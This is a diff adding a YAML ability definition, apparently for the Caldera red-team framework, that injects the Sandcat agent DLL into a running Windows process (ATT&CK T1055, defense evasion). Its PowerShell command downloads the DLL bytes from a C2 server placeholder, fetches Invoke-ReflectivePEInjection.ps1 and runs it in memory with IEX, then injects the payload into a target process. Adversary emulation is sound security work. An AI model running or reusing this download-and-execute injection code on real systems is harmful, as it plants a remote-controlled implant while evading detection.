@@ -1,0 +1,25 @@
+---
+
+- id: a398986f-31b0-436a-87e9-c8e82c028f3c
+  name: Inject Sandcat into process
+  description: Injects sandcat DLL into an available process
+  tactic: defense evasion
+  technique:
+    attack_id: T1055
+    name: Process Injection
+  platforms:
+    windows:
+      psh:
+        command: |
+          $url="#{server}/file/download";
+          $wc=New-Object System.Net.WebClient;
+          $wc.Headers.add("platform","windows");
+          $wc.Headers.add("file","shared.go");
+          $wc.Headers.add("defaultServer","#{server}");
+          $wc.Headers.add("defaultSleep","60");
+          $wc.Headers.add("defaultGroup","stowaway");
+          $PEBytes = $wc.DownloadData($url);
+          $wc1 = New-Object System.net.webclient;
+          $wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");
+          IEX ($wc1.DownloadString($url));
+          Invoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}
